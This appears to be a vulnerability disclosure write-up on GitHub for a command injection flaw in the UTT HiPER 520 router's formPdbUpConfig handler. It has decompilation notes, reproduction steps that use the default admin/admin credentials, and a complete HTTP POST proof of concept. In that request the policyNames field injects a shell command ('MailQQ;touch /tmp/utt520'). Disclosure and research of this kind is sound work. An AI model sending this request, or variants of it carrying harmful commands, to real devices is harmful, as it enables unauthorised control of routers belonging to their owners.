# UTT520CVE
# Information
Product supplier: UTT
Supplier website: UTT-Professional router, switch, firewall brand
Affected product: HiPER 520
Firmware version affected: nv520v3v1.7.7-160105
Firmware download address: UTT AITAI - professional router, switch, firewall brand

<img width="1084" height="255" alt="image" src="https://github.com/user-attachments/assets/8f53104d-173e-4bfd-9932-5696e77ed655" />
<img width="1051" height="674" alt="image" src="https://github.com/user-attachments/assets/ba78df83-3267-49eb-8c1d-2112f8702e00" />
We click and fllow sub_44D264
We can look policyNames will transprot Var ,next will tansport updateOneProfilePdb.
Click updateOneProfilePdb and fllow
<img width="1269" height="641" alt="image" src="https://github.com/user-attachments/assets/bba4a5ab-b022-4557-8bcd-4d1a06782198" />
There have Command inject

# Reproduction Steps
First, use telnetd to get a shell and observe the behavior telnet 192.168.1.1 60023 The login username and password are admin/admin
<img width="1127" height="581" alt="image" src="https://github.com/user-attachments/assets/bcedcab5-a134-4fbc-b79b-29ce3f0d4c75" />
We click on this tab and then capture the packet to make some modifications.
<img width="1541" height="624" alt="image" src="https://github.com/user-attachments/assets/06756f66-171b-48d2-a76c-687532ee3ad8" />
This data packet contains our authentication and other information.
<img width="1243" height="825" alt="image" src="https://github.com/user-attachments/assets/c340ccc3-51c8-4e49-8713-953acc1c2254" />
Construct the following data packet and then send it.
<img width="1226" height="703" alt="image" src="https://github.com/user-attachments/assets/adcdb34a-63d2-4eb2-9cae-146014d97f8a" />
<img width="1142" height="696" alt="image" src="https://github.com/user-attachments/assets/e0431d88-2a1d-4dfd-b876-721166523f4f" />
Command inject sucessful!

# POC
```
POST /goform/formPdbUpConfig HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://192.168.1.1
Authorization: Digest username="admin", realm="UTT", nonce="32cf081b91ed557f1818f4e219f246a0", uri="/goform/formPdbUpConfig", algorithm=MD5, response="fb1a857062b6cffb12ada28fe2b733ef", opaque="5ccc069c403ebaf9f0171e9517f40e41", qop=auth, nc=00000072, cnonce="ccb83ef672014da9"
Connection: keep-alive
Referer: http://192.168.1.1/PdbUpdata.asp
Cookie: language=zhcn; utt_bw_rdevType=
Upgrade-Insecure-Requests: 1
Priority: u=0, i

policyNames=MailQQ;touch /tmp/utt520
```

